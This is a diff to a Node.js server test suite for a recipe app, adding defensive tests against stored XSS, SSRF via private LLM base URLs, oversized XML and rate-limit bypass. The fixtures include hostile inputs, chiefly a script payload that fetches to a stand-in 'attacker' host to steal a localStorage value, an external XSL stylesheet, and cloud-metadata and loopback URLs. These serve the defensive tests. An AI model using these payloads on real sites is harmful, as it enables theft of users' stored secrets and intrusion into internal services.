@@ -35,9 +35,11 @@ function startServer(extraEnv = {}) {
   const dbPath = path.join(dir, 'test.sqlite');
   const env = { ...process.env, PORT: '0', FLOW_DB_PATH: dbPath, NODE_ENV: 'test', FLOW_INTERRUPT_CHECK_MS: '500' };
   for (const key of ['FLOW_LLM_PROVIDER', 'FLOW_LLM_MODEL', 'FLOW_LLM_API_KEY', 'FLOW_LLM_BASE_URL', 'ANTHROPIC_API_KEY',
-    'OPENAI_API_KEY', 'FLOW_UPLOAD_TOKEN', 'FLOW_ALLOW_MOCK_LLM', 'FLOW_IMPORT_ALLOW_PRIVATE']) {
+    'OPENAI_API_KEY', 'FLOW_UPLOAD_TOKEN', 'FLOW_ALLOW_MOCK_LLM', 'FLOW_IMPORT_ALLOW_PRIVATE', 'FLOW_LLM_ALLOW_PRIVATE',
+    'FLOW_CHECK_RATE_LIMIT', 'FLOW_CHECK_MAX_BYTES', 'FLOW_TRUST_PROXY']) {
     delete env[key];
   }
+  env.FLOW_CHECK_RATE_LIMIT = '1000';
   for (const [key, value] of Object.entries(extraEnv)) {
     if (value === undefined) delete env[key];
     else env[key] = value;
@@ -135,7 +137,7 @@ async function waitForJob(base, jobId) {
 }
 
 test('server: recipe import and user recipes', async (t) => {
-  const server = startServer({ FLOW_IMPORT_ALLOW_PRIVATE: '1' });
+  const server = startServer({ FLOW_IMPORT_ALLOW_PRIVATE: '1', FLOW_LLM_ALLOW_PRIVATE: '1' });
   const fixtures = await startFixtureServer();
   t.after(async () => {
     await fixtures.close();
@@ -275,7 +277,13 @@ test('server: recipe import and user recipes', async (t) => {
     res = await request('GET', `${base}/api/recipes/my-sandwich`);
     assert.strictEqual(res.status, 200);
     assert.match(res.headers.get('content-type'), /application\/xml/);
-    assert.strictEqual(res.body, SANDWICH_XML);
+    // The root id is rewritten to the id the recipe is stored under (it was "sandwich").
+    assert.strictEqual(res.body, SANDWICH_XML.replace(/(<recipe\b[^>]*\sid=)"sandwich"/, '$1"my-sandwich"'));
+    assert.match(res.body, /<recipe\b[^>]*\sid="my-sandwich"/);
+    // Served as inert data: no sniffing, no scripts, no resources.
+    assert.strictEqual(res.headers.get('x-content-type-options'), 'nosniff');
+    assert.strictEqual(res.headers.get('content-security-policy'), "default-src 'none'; sandbox");
+    assert.match(res.headers.get('content-disposition'), /^inline; filename="my-sandwich\.xml"$/);
 
     // A session can use the user recipe.
     res = await request('POST', `${base}/api/sessions`, { sessionId: 'import-test', dishes: [{ recipeId: 'my-sandwich' }] });
@@ -293,6 +301,67 @@ test('server: recipe import and user recipes', async (t) => {
     assert.strictEqual(res.status, 200);
     res = await request('GET', `${base}/api/recipes/my-sandwich`);
     assert.strictEqual(res.status, 404);
+  });
+
+  await t.test('POST /api/recipes refuses foreign elements, namespaces and processing instructions (stored XSS)', needsImporter, async () => {
+    const script = '<h:script xmlns:h="http://www.w3.org/1999/xhtml">fetch("https://attacker/?k="+localStorage.getItem("flow-recipe-llm"))</h:script>';
+    const cases = {
+      'xhtml-script': SANDWICH_XML.replace('</title>', `</title>${script}`),
+      'plain-script': SANDWICH_XML.replace('</title>', '</title><script>alert(1)</script>'),
+      'default-ns': SANDWICH_XML.replace('<recipe ', '<recipe xmlns="http://www.w3.org/1999/xhtml" '),
+      stylesheet: SANDWICH_XML.replace(/(<\?xml[^?]*\?>)/, '$1<?xml-stylesheet type="text/xsl" href="https://attacker/x.xsl"?>'),
+      'unknown-element': SANDWICH_XML.replace('</title>', '</title><notes>hi</notes>'),
+    };
+    for (const [id, xml] of Object.entries(cases)) {
+      assert.notStrictEqual(xml, SANDWICH_XML, id);
+      let res = await request('POST', `${base}/api/recipes`, { xml, id: `evil-${id}` });
+      assert.strictEqual(res.status, 422, `${id}: ${JSON.stringify(res.body)}`);
+      res = await request('GET', `${base}/api/recipes/evil-${id}`);
+      assert.strictEqual(res.status, 404, id);
+      res = await request('POST', `${base}/api/recipes/check`, { xml });
+      assert.strictEqual(res.body.ok, false, id);
+    }
+  });
+
+  await t.test('POST /api/recipes stores the given id in the root element', needsImporter, async () => {
+    let res = await request('POST', `${base}/api/recipes`, { xml: SANDWICH_XML.replace(/\sid="sandwich"/, ' id="whatever"'), id: 'my-cookies' });
+    assert.strictEqual(res.status, 201, JSON.stringify(res.body));
+    res = await request('GET', `${base}/api/recipes/my-cookies`);
+    assert.match(res.body, /<recipe\b[^>]*\sid="my-cookies"/);
+    assert.doesNotMatch(res.body, /id="whatever"/);
+    await request('DELETE', `${base}/api/recipes/my-cookies`);
+  });
+
+  await t.test('check and convert answer 422, not 500, for XML the converter cannot parse', needsConversions, async () => {
+    for (const xml of ['<recipe><title>x</title', '<!DOCTYPE r [<!ENTITY a "aaa">]><recipe>&a;</recipe>']) {
+      let res = await request('POST', `${base}/api/recipes/convert`, { xml });
+      assert.strictEqual(res.status, 422, `convert ${xml}: ${JSON.stringify(res.body)}`);
+      assert.strictEqual(typeof res.body.error, 'string');
+      res = await request('POST', `${base}/api/recipes/check`, { xml, metricize: true });
+      assert.strictEqual(res.status, 422, `check ${xml}: ${JSON.stringify(res.body)}`);
+      assert.strictEqual(res.body.ok, false);
+    }
+  });
+
+  await t.test('check refuses oversized XML', needsImporter, async () => {
+    const big = SANDWICH_XML.replace('</recipe>', `<!-- ${'x'.repeat(300 * 1024)} --></recipe>`);
+    const res = await request('POST', `${base}/api/recipes/check`, { xml: big });
+    assert.strictEqual(res.status, 413);
+  });
+
+  await t.test('POST /api/import result id matches the root id and avoids taken ids', needsImporter, async () => {
+    const res = await request('POST', `${base}/api/import`, { text: 'Buns: bake buns.', llm: { provider: 'mock', mockResponse: BUNS_XML } });
+    assert.strictEqual(res.status, 202);
+    const job = await waitForJob(base, res.body.jobId);
+    assert.strictEqual(job.status, 'done', JSON.stringify(job.error));
+    assert.notStrictEqual(job.result.id, 'buns');
+    assert.strictEqual(job.result.check.id, job.result.id);
+    assert.match(job.result.xml, new RegExp(`<recipe\\b[^>]*\\sid="${job.result.id}"`));
+    // Saving it without an explicit id uses that root id.
+    const saved = await request('POST', `${base}/api/recipes`, { xml: job.result.xml });
+    assert.strictEqual(saved.status, 201, JSON.stringify(saved.body));
+    assert.strictEqual(saved.body.id, job.result.id);
+    await request('DELETE', `${base}/api/recipes/${saved.body.id}`);
   });
 
   await t.test('POST /api/import runs a job with the mock LLM on a fetched page', needsImporter, async () => {
@@ -327,10 +396,13 @@ test('server: recipe import and user recipes', async (t) => {
       url: `${fixtures.url}/recipe.html`,
       llm: { provider: 'openai-compatible', model: 'x', apiKey: SECRET_KEY, baseUrl: `${fixtures.url}/llm` },
     });
-    assert.strictEqual(res.status, 202);
+    assert.strictEqual(res.status, 202, JSON.stringify(res.body));
     const job = await waitForJob(base, res.body.jobId);
     assert.strictEqual(job.status, 'error');
     assert.strictEqual(typeof job.error, 'string');
+    // The body of a client-supplied endpoint is never echoed (it may be an internal service): status code only.
+    assert.match(job.error, /HTTP 500/);
+    assert.doesNotMatch(job.error, /bad request with/);
     assert.ok(!JSON.stringify(job).includes(SECRET_KEY), 'job does not contain the key');
     assert.ok(!server.output().includes(SECRET_KEY), 'logs do not contain the key');
   });
@@ -388,10 +460,29 @@ test('server: upload token, mock gating and private address guard', async (t) =>
     assert.match(res.body.error, /mock/);
   });
 
+  await t.test('POST /api/import refuses a private llm.baseUrl unless the operator allows it', needsImporter, async () => {
+    for (const baseUrl of [`${fixtures.url}/llm`, 'http://localhost:4888/v1', 'http://[::ffff:7f00:1]:4888/v1', 'http://169.254.169.254/latest']) {
+      const res = await request('POST', `${base}/api/import`, {
+        text: 'Pancakes: mix 1 cup flour with 1 cup milk.',
+        llm: { provider: 'openai-compatible', apiKey: SECRET_KEY, baseUrl },
+      }, auth);
+      assert.strictEqual(res.status, 400, `${baseUrl}: ${JSON.stringify(res.body)}`);
+      assert.match(res.body.error, /llm\.baseUrl/);
+    }
+    // Ollama's default (localhost) is the operator's business too.
+    let res = await request('POST', `${base}/api/import`, { text: 'Pancakes', llm: { provider: 'ollama' } }, auth);
+    assert.strictEqual(res.status, 400, JSON.stringify(res.body));
+    // A query string would let the caller pick the upstream path.
+    res = await request('POST', `${base}/api/import`, {
+      text: 'Pancakes', llm: { provider: 'openai-compatible', apiKey: SECRET_KEY, baseUrl: 'https://example.com/admin?x=' },
+    }, auth);
+    assert.strictEqual(res.status, 400);
+  });
+
   await t.test('private addresses are not fetched without FLOW_IMPORT_ALLOW_PRIVATE', needsImporter, async () => {
     const res = await request('POST', `${base}/api/import`, {
       url: `${fixtures.url}/recipe.html`,
-      llm: { provider: 'openai-compatible', apiKey: SECRET_KEY, baseUrl: `${fixtures.url}/llm` },
+      llm: { provider: 'openai', apiKey: SECRET_KEY },
     }, auth);
     assert.strictEqual(res.status, 202);
     const job = await waitForJob(base, res.body.jobId);
@@ -401,9 +492,40 @@ test('server: upload token, mock gating and private address guard', async (t) =>
   });
 });
 
-test('importJobs: private address detection', () => {
-  const { isPrivateAddress } = require('../src/services/importJobs');
-  for (const a of ['127.0.0.1', '10.1.2.3', '192.168.0.1', '172.16.5.4', '169.254.169.254', '::1', '::ffff:127.0.0.1', 'fd00::1', '0.0.0.0']) {
+test('server: recipe check endpoints are rate limited per client', needsImporter, async (t) => {
+  const server = startServer({ FLOW_CHECK_RATE_LIMIT: '2' });
+  t.after(() => server.stop());
+  const base = await server.ready;
+  let res = await request('POST', `${base}/api/recipes/check`, { xml: SANDWICH_XML });
+  assert.strictEqual(res.status, 200);
+  res = await request('POST', `${base}/api/recipes/convert`, { xml: SANDWICH_XML });
+  assert.notStrictEqual(res.status, 429);
+  res = await request('POST', `${base}/api/recipes/check`, { xml: SANDWICH_XML });
+  assert.strictEqual(res.status, 429);
+  assert.ok(Number(res.headers.get('retry-after')) > 0);
+});
+
+test('server: a private LLM base URL configured by the operator is allowed for clients', needsImporter, async (t) => {
+  const fixtures = await startFixtureServer();
+  const server = startServer({ FLOW_LLM_PROVIDER: 'ollama', FLOW_LLM_BASE_URL: `${fixtures.url}/llm` });
+  t.after(async () => {
+    await fixtures.close();
+    await server.stop();
+  });
+  const base = await server.ready;
+  let res = await request('POST', `${base}/api/import`, { text: 'Toast: toast bread.', llm: { provider: 'ollama', baseUrl: `${fixtures.url}/llm/` } });
+  assert.strictEqual(res.status, 202, JSON.stringify(res.body));
+  const job = await waitForJob(base, res.body.jobId);
+  assert.strictEqual(job.status, 'error');
+  assert.match(job.error, /HTTP 500/, 'reached the operator-configured endpoint');
+  res = await request('POST', `${base}/api/import`, { text: 'Toast', llm: { provider: 'ollama', baseUrl: `${fixtures.url}/other` } });
+  assert.strictEqual(res.status, 400, 'another private URL is still refused');
+});
+
+test('importer: private address detection used by the server', async () => {
+  const { isPrivateAddress } = await import(require('node:url').pathToFileURL(IMPORTER).href);
+  for (const a of ['127.0.0.1', '10.1.2.3', '192.168.0.1', '172.16.5.4', '169.254.169.254', '::1', '::ffff:127.0.0.1', 'fd00::1', '0.0.0.0',
+    '::ffff:7f00:1', '::7f00:1', '64:ff9b::7f00:1', '2002:7f00:1::', 'fec0::1', '198.18.0.1']) {
     assert.strictEqual(isPrivateAddress(a), true, a);
   }
   for (const a of ['93.184.216.34', '1.1.1.1', '2606:4700:4700::1111']) {
